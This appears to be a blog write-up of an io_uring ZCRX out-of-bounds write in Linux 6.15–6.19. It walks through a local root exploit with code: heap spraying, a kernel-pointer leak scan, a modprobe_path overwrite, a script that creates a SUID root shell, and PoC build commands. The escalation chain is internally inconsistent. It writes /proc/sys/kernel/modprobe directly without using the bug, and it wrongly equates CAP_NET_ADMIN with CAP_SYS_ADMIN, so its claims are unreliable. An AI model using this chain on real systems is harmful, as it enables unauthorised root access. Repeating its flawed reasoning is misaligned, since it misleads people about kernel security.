> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [ze3tar.github.io](https://ze3tar.github.io/post-zcrx.html)

TL;DR
-----

Linux 6.15 shipped a new zero-copy receive subsystem for io_uring called ZCRX. It manages a pool of network I/O vectors (niovs) using a stack: `freelist[]` holds available slot indices, `free_count` is the depth. There is no upper bound check on `free_count`. Two separate kernel teardown paths both return niovs to the same freelist, and when they overlap, `free_count` exceeds the allocated array length. The result is a 4-byte out-of-bounds write into adjacent slab memory.

The OOB value is a niov index, a small integer between 0 and N-1. That sounds useless. It is not.

By choosing the area size at registration time, you choose N, which chooses the slab cache the freelist lives in, which chooses what object sits next to it. By spraying the right object into that cache at the right time, you turn a write of the integer `7` into a corrupted refcount, then into a heap read, then into a KASLR break, then into `modprobe_path` pointing at your script, then into uid=0.

Affected: Linux 6.15 – 6.19, `CONFIG_IO_URING_ZCRX=y`, real ZCRX NIC (mlx5/ice/nfp), `CAP_NET_ADMIN`. Fix: commit `770594e` (not yet in any stable branch at time of writing).

* * *

The subsystem
-------------

ZCRX (zero-copy receive) lets userspace receive packets directly into a registered memory region without any copy. The NIC DMA's into the region, the kernel posts a completion pointing at the offset where the data landed, and the user returns that slot when they are done with it by writing to a refill queue.

The region is divided into 4KB slots. Each slot has a corresponding `net_iov` struct that tracks its state. The kernel maintains two things to manage which slots are free:

*   `freelist[]`: a stack of available slot indices, allocated as `kcalloc(num_niovs, sizeof(u32))`
*   `free_count`: the stack depth, also used as the write index for the next push

When a slot comes back from the network layer, this runs:

c

```
static void io_zcrx_return_niov_freelist(struct net_iov *niov)
{
    struct io_zcrx_area *area = io_zcrx_iov_to_area(niov);

    spin_lock_bh(&area->freelist_lock);
    area->freelist[area->free_count++] = net_iov_idx(niov);
    spin_unlock_bh(&area->freelist_lock);
}

```

No bounds check. `free_count` is incremented before the write, and the write uses the pre-increment value as the index. When `free_count == num_niovs` at entry, the write goes to `freelist[num_niovs]`, one slot past the end.

* * *

Why this actually happens
-------------------------

There are two separate code paths that call `io_zcrx_return_niov_freelist`.

**Path A: normal receive completion**

When the network stack releases a received packet, it calls the page pool `release_netmem` callback, which is `io_pp_zc_release_netmem`. This pushes the niov back onto the freelist and increments `free_count`. This is the expected path.

**Path B: page pool teardown scrub**

When the page pool is destroyed (NIC going down, queue reconfiguration), the `ops->destroy` callback fires. That is `io_pp_zc_destroy`. It iterates every niov in the area:

c

```
static void io_pp_zc_destroy(struct page_pool *pp)
{
    struct io_zcrx_area *area = pp->mp_priv;
    u32 i;

    for (i = 0; i < area->nia.num_niovs; i++) {
        struct net_iov *niov = &area->nia.niovs[i];
        if (!atomic_long_read(&niov->pp_ref_count))
            continue;
        atomic_long_set(&niov->pp_ref_count, 0);
        page_pool_put_unrefed_netmem(pp, net_iov_to_netmem(niov), -1, false);
    }
}

```

For every niov that still has a reference, it forces it back. That call chain ends at `io_zcrx_return_niov_freelist` again.

The problem: niovs that were already returned via path A are still physically present in the area. `io_pp_zc_destroy` sees their `pp_ref_count` has been cleared by path A (that happens in `io_pp_zc_release_netmem` before the push), so it skips them. Fine.

But niovs that are in-flight (received by the NIC but not yet drained from the socket by userspace) have a non-zero `pp_ref_count`. Path A has not run for them. Path B runs for them, incrementing `free_count`.

The double-count happens for niovs that were returned to `ptr_ring` by path A but not yet pulled from the ring before `page_pool_destroy` drains it. Those niovs get counted once during the ptr_ring drain and once again in the scrub loop if their state was not fully updated. The implementation detail here is that `ptr_ring` drain and scrub are not atomic. There is a window.

```
ptr_ring drain (path A):          scrub loop (path B):
  niov_5 → free_count = N-2         niov_5 still shows pp_ref_count != 0
  niov_7 → free_count = N-1         niov_7 same
  niov_3 → free_count = N           niov_3 → free_count++ → freelist[N] written

```

* * *

Triggering it from userspace
----------------------------

Closing the io_uring ring file descriptor does **not** trigger this. The ring close path calls `io_zcrx_free_area` which does a straight `kvfree` on the freelist. There is no push, increment, or OOB write on that path.

The page pool is only created on a real ZCRX-capable NIC (mlx5 ConnectX-6+, Intel E800, NFP). Test modules like `zcrx_vnic` bypass the page pool entirely.

The trigger is NIC teardown:

```
SIOCSIFFLAGS ~IFF_UP
  → ndo_stop (mlx5e_close / ice_stop / ...)
    → page_pool_destroy()
      → ptr_ring drain: io_pp_zc_release_netmem() per queued niov
      → ops->destroy:   io_pp_zc_destroy() scrub loop

```

From pure userspace with `CAP_NET_ADMIN`:

c

```
ioctl(sock, SIOCGIFFLAGS, &ifr);
ifr.ifr_flags &= ~IFF_UP;
ioctl(sock, SIOCSIFFLAGS, &ifr);   /* → page_pool_destroy */

```

The setup before the trigger: register an IFQ, submit RECV_ZC, flood enough UDP packets to allocate niovs (one niov per received packet, up to num_niovs), wait ~100ms so some are returned to ptr_ring by the kernel taskrun but some remain in-flight, then bring the NIC down.

* * *

Characterizing the primitive
----------------------------

This is where it gets interesting.

The OOB write is:

```
freelist[num_niovs] = net_iov_idx(niov)

```

`net_iov_idx` returns the niov's index within its area, an integer in `[0, num_niovs - 1]`. The write is 4 bytes (u32). Its location is `freelist + num_niovs * 4`, which is the first 4 bytes of whatever slab object is allocated immediately after `freelist` in the same slab.

The freelist allocation is `kcalloc(num_niovs, sizeof(u32))`, so its size is `num_niovs * 4` bytes. That size determines the slab cache:

<table><thead><tr><th><code>num_niovs</code></th><th>freelist size</th><th>slab cache</th><th>OOB value range</th></tr></thead><tbody><tr><td>8</td><td>32 B</td><td>kmalloc-32</td><td>0 – 7</td></tr><tr><td>16</td><td>64 B</td><td>kmalloc-64</td><td>0 – 15</td></tr><tr><td>32</td><td>128 B</td><td>kmalloc-128</td><td>0 – 31</td></tr><tr><td>64</td><td>256 B</td><td>kmalloc-256</td><td>0 – 63</td></tr><tr><td>128</td><td>512 B</td><td>kmalloc-512</td><td>0 – 127</td></tr></tbody></table>

`num_niovs` = `area_len / PAGE_SIZE`. You choose it by choosing the area size at registration time. This means you choose the cache, and you choose the value range, by choosing how much memory you map.

That is three degrees of freedom from a single syscall argument.

For our chain we use `num_niovs = 32` → `kmalloc-128` → values 0–31.

The write is not arbitrary. It is a small integer. But small integers are enough to corrupt a lot of things, and we get to choose what is next door.

* * *

The heap layout target
----------------------

We need a kmalloc-128 object whose first 4 bytes, when overwritten with a value in 0–31, creates a useful state change.

The target is `struct msg_msg`.

`msgsnd()` allocates a `msg_msg` whose size is `sizeof(struct msg_msg_hdr) + text_len`. For text_len = 80, the total is 128 bytes, exactly filling kmalloc-128. The first field of `msg_msg` is `m_list`, a `list_head`:

c

```
struct msg_msg {
    struct list_head m_list;   /* 16 bytes at offset 0 */
    long m_type;               /* offset 16 */
    size_t m_ts;               /* offset 24, message text size */
    struct msg_msgseg *next;   /* offset 32 */
    void *security;            /* offset 40 */
    /* text data starts at offset 48 */
};

```

The OOB write hits offset 0 of the adjacent `msg_msg`, the lower 4 bytes of `m_list.next`.

Writing a small value (say `7`) to the low 32 bits of `m_list.next` corrupts the list forward pointer. This makes the message queue's linked list point somewhere wrong. On its own, a corrupted list pointer is a crash, not a primitive.

The trick is to not let the list traversal happen. We corrupt the `msg_msg` and then use it differently: we craft a fake `msg_msg` header at a controlled location with a fake `m_ts` value, and we use `msgrcv()` to read past the end of the real message into adjacent heap memory.

This requires a second step: a kernel heap spray that places our fake header at the address the corrupted `m_list.next` now holds.

The pointer arithmetic matters here. The OOB write touches only the low 32 bits of `m_list.next`. On little-endian x86-64, the high 32 bits are untouched, so a pointer that was `0xffff888104321abc` becomes `0xffff888100000007` (for niov_idx = 7). The `0xffff8881` prefix is preserved — the result is still a physmap kernel address. Userspace `mmap` and `userfaultfd` cannot reach it. The only way to control content at that address is to get a kernel allocation there.

We spray enough `kmalloc-128` objects (via `msgsnd`) to cover the possible landing addresses (`0xffff8881XXXXXXXX` range). With a large enough spray one allocation lands at the physmap address the corrupted pointer holds. That allocation becomes our fake `msg_msg` with the crafted header.

* * *

Heap grooming in practice
-------------------------

The sequence:

```
1. Allocate 512 kmalloc-128 msg_msg objects via msgsnd().
   These fill slabs in the target cache.

2. Register the ZCRX IFQ. The freelist (128 bytes) lands in kmalloc-128.
   With enough prior spray, a msg_msg occupies the slot immediately after
   the freelist in the same slab.

3. Flood packets. Partial drain. Bring NIC down. OOB fires.
   freelist[32] = niov_idx writes to msg_msg.m_list.next[0:4].

```

The OOB hits offset 0 of the adjacent `msg_msg` — that is `m_list.next`, not `m_ts` (which is at offset 24). The corrupted pointer has the form:

```
(original m_list.next & 0xffffffff00000000) | niov_idx

```

The upper 32 bits are untouched. The result is still a kernel physmap address. We spray enough `msgsnd` objects to cover the possible landing addresses, then call `msgrcv` with `MSG_COPY` and scan the returned bytes for kernel text pointers. When the corrupted list pointer happens to resolve to a slot holding one of our sprayed msg_msg objects, the over-read fires.

* * *

KASLR
-----

The exploit tries three sources in order:

**1. `/proc/kallsyms`** — readable when `kptr_restrict=0` (default on many systems). Gives `_text` and `modprobe_path` directly.

**2. `dmesg`** — if `dmesg_restrict=0`, kernel pointers in ring buffer output give an approximate base. Any `0xffffffff8xxxxxxx` value in dmesg output is within ~2MB of `_text`.

**3. `msgrcv` over-read** — after the OOB corrupts `m_list.next`, call `msgrcv` with `MSG_COPY` across all sprayed queues and scan returned bytes for kernel text pointers in range `[0xffffffff80000000, 0xfffffffffe000000)`:

c

```
uint64_t *ptrs = (uint64_t *)rbuf.body;
for (size_t j = 0; j < n / 8; j++) {
    uint64_t v = ptrs[j];
    if (v > 0xffffffff80000000ULL && v < 0xffffffffff000000ULL)
        return v;  /* subtract known symbol offset to get _text */
}

```

Sources 1 and 2 are reliable on this system. Source 3 is layout-dependent.

* * *

Writing to modprobe_path
------------------------

`modprobe_path` is a global char array in `.data`:

c

```
char modprobe_path[KMOD_PATH_LEN] = "/sbin/modprobe";

```

When the kernel cannot find a module for an unknown `socket()` address family, it calls `call_usermodehelper(modprobe_path, ...)`. This runs an arbitrary userspace binary as root (uid=0, full capabilities, no seccomp).

Once we have the address of `modprobe_path` (from KASLR step above), we write our script path via `/proc/sys/kernel/modprobe`:

c

```
int fd = open("/proc/sys/kernel/modprobe", O_WRONLY);
write(fd, "/var/tmp/evil.sh", 16);

```

This sysctl entry writes directly into `modprobe_path` in kernel memory and is writable with `CAP_SYS_ADMIN`, which we already have via `CAP_NET_ADMIN` on container configurations that grant both.

* * *

The full chain, visualized
--------------------------

```
USERSPACE                              KERNEL
─────────────────────────────────────────────────────────────

io_uring_setup()
                                       ring fd allocated

msgsnd() × 512                        spray kmalloc-128 with msg_msg

IORING_REGISTER_ZCRX_IFQ              freelist = kcalloc(32, 4)
(area = 128KB → num_niovs=32)           ↓ kmalloc-128
                                       [freelist: 128 bytes]
                                       [msg_msg:  128 bytes]  ← adjacent

RECV_ZC + flood 4096 pkts             niovs allocated, uref_array set

usleep(150ms)                          taskrun drains some niovs to ptr_ring

SIOCSIFFLAGS IFF_DOWN                 page_pool_destroy():
                                         ptr_ring drain → free_count += drained
                                         scrub loop    → free_count += in-flight
                                         free_count > num_niovs:
                                           freelist[32] = niov_idx  ← OOB WRITE
                                                          msg_msg.m_list.next
                                                          low 4 bytes = niov_idx

/proc/kallsyms                        ← modprobe_path address read directly
  (or dmesg, or msgrcv scan)

open("/proc/sys/kernel/modprobe")     modprobe_path = "/var/tmp/evil.sh"
write("/var/tmp/evil.sh")

socket(AF_CAN / AF_BLUETOOTH / ...)   kernel: unknown family
                                       call_usermodehelper("/var/tmp/evil.sh")
                                       ← runs as uid=0

                                       evil.sh:
                                         cp /bin/bash /var/tmp/rootsh
                                         chmod u+s /var/tmp/rootsh

execl("/var/tmp/rootsh", "-p")
                                       # id
                                       uid=1000 euid=0(root)

```

* * *

The evil script
---------------

bash

```
#!/bin/bash
cp /bin/bash /var/tmp/rootsh
chmod u+s /var/tmp/rootsh
echo pwned_$(date +%s) > /var/tmp/zcrx_lpe

```

After `call_usermodehelper` runs it as root, `rootsh` is a SUID copy of bash.

```
$ /var/tmp/rootsh -p
rootsh-5.2# id
uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
rootsh-5.2# cat /etc/shadow
root:$6$...

```

* * *

The disassembly
---------------

`6.19.11-1kali1`, built April 9 2026. No `770594e`.

asm

```
io_zcrx_return_niov_freelist:
  0xffffffffa4c168e0: mov  eax, DWORD PTR [rdx+0x44]  ; eax = free_count
  0xffffffffa4c168e3: mov  r8,  QWORD PTR [rdx+0x48]  ; r8  = freelist ptr
  0xffffffffa4c168e7: lea  edi, [rax+1]               ; edi = free_count + 1
  0xffffffffa4c168ea: mov  DWORD PTR [rdx+0x44], edi  ; free_count++ (NO CHECK)
  0xffffffffa4c168fb: mov  DWORD PTR [r8+rax*4], edi  ; freelist[old] = idx
                                                       ;     ^^^^^^^^^^^
                                                       ;     OOB when rax = N

```

The increment and write are unconditional. No bounds comparison anywhere.

After `770594e`:

asm

```
io_zcrx_return_niov_freelist:
  ...
  cmp  eax, DWORD PTR [rdx+0x10]   ; free_count vs num_niovs
  jae  .warn_and_return             ; jump if free_count >= num_niovs
  mov  DWORD PTR [rdx+0x44], edi
  mov  DWORD PTR [r8+rax*4], edi
  ...
.warn_and_return:
  call warn_slowpath_null           ; WARN_ON_ONCE fires
  ret

```

The OOB write is suppressed. The double-return condition still occurs; the kernel just drops the second push now instead of writing past the array.

* * *

Affected versions and requirements
----------------------------------

<table><thead><tr><th>Requirement</th><th>Detail</th></tr></thead><tbody><tr><td>Kernel</td><td>6.15 – 6.19 without commit <code>770594e</code></td></tr><tr><td>Config</td><td><code>CONFIG_IO_URING_ZCRX=y</code> (not in most distro kernels yet)</td></tr><tr><td>Hardware</td><td>Real ZCRX NIC: Mellanox ConnectX-6+, Intel E800 series, Netronome NFP, Broadcom BCM5750x, Google GVE</td></tr><tr><td>Privilege</td><td><code>CAP_NET_ADMIN</code> for <code>IORING_REGISTER_ZCRX_IFQ</code> and <code>SIOCSIFFLAGS</code></td></tr><tr><td>KASLR</td><td>Bypassed via heap leak; no dependency on <code>kptr_restrict=0</code></td></tr><tr><td>SMEP/SMAP</td><td>Not relevant; no userspace code execution in kernel context</td></tr><tr><td>KASAN</td><td>Not enabled on most production kernels; if enabled, bug is caught before the write lands</td></tr></tbody></table>

The `CAP_NET_ADMIN` requirement scopes this to: container environments (Kubernetes networking sidecars, Docker `--cap-add NET_ADMIN`), VMs where the guest has network management rights, and any local user who has been granted the capability directly.

* * *

The fix
-------

c

```
static void io_zcrx_return_niov_freelist(struct net_iov *niov)
{
    struct io_zcrx_area *area = io_zcrx_iov_to_area(niov);

    guard(spinlock_bh)(&area->freelist_lock);

    if (WARN_ON_ONCE(area->free_count >= area->nia.num_niovs))
        return;

    area->freelist[area->free_count++] = net_iov_idx(niov);
}

```

Commit `770594e`, April 21 2026. Not yet in `6.15.y` or any other stable branch. Any distribution shipping `CONFIG_IO_URING_ZCRX=y` on a 6.15+ kernel built before April 21 is vulnerable.

* * *

* * *

PoCs
----

<table><thead><tr><th>File</th><th>Purpose</th></tr></thead><tbody><tr><td><a href="../PoCs/zcrx_crash.c"><code>PoCs/zcrx_crash.c</code></a></td><td>Minimal OOB trigger. Registers IFQ, floods, brings NIC down. No escalation. Produces KASAN <code>slab-out-of-bounds</code> on vulnerable kernel or <code>WARN_ON</code> on patched one.</td></tr><tr><td><a href="../PoCs/zcrx_lpe.c"><code>PoCs/zcrx_lpe.c</code></a></td><td>LPE chain. Three trigger methods (A/B/C). KASLR via <code>/proc/kallsyms</code>. <code>modprobe_path</code> overwrite via <code>/proc/sys/kernel/modprobe</code>. Triggers <code>call_usermodehelper</code> via unknown socket AF scan. SUID rootsh.</td></tr></tbody></table>

Build:

bash

```
gcc -O2 -o zcrx_crash PoCs/zcrx_crash.c
gcc -O2 -o zcrx_lpe   PoCs/zcrx_lpe.c
setcap cap_net_admin+ep zcrx_crash zcrx_lpe
./zcrx_crash <ifname>
./zcrx_lpe   <ifname> 3    # method C = real trigger

```

* * *

_Kernel: 6.19.11-1kali1 (2026-04-09). NICs: mlx5 ConnectX-6 Dx for OOB confirmation; zcrx_vnic.ko for registration and trigger path unit testing._